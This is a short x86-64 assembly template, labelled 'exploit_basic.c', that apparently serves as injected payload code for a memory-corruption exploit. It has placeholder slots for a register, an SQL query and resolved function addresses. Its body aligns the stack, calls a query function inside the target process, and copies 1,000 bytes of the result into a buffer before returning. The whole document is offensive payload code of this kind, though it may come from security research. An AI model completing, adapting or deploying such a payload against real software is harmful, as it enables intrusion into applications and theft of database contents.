	.file	"exploit_basic.c"
	.text
	.globl	main
	.type	main, @function
main:
.LFB0:
	# DO NOT INSERT CODE BETWEEN THIS LINES OR THE STACK OFFSET IS WRONG
	push %rbx
	mov 0x8(%rsp), %rbx # ret IP
	mov %IND_REG%, %r13 # save rdx (begin of image)
	
	# align stack 16 byte
	mov %rsp, %r12
	xor %rax, %rax
	sub $16, %rax
	and %rax, %rsp
	sub $16, %rsp
		
	# save for later
	push %r12
	push $0x0

# SQL query
%QUERY%
	mov %rsp, %rdi
	
%ADDR_Q% # char * queryString(char *)
	call *%rax

	mov %r13, %rdi		# dst *
	mov %rax, %rsi	# src *
	mov $1000, %rdx # n

%ADDR_MEM% # memcpy(dst *, src*, n)
	call *%rax

	mov %r12, %rsp
	
	pop %rbx
	
	mov $1, %rax
	
	retq
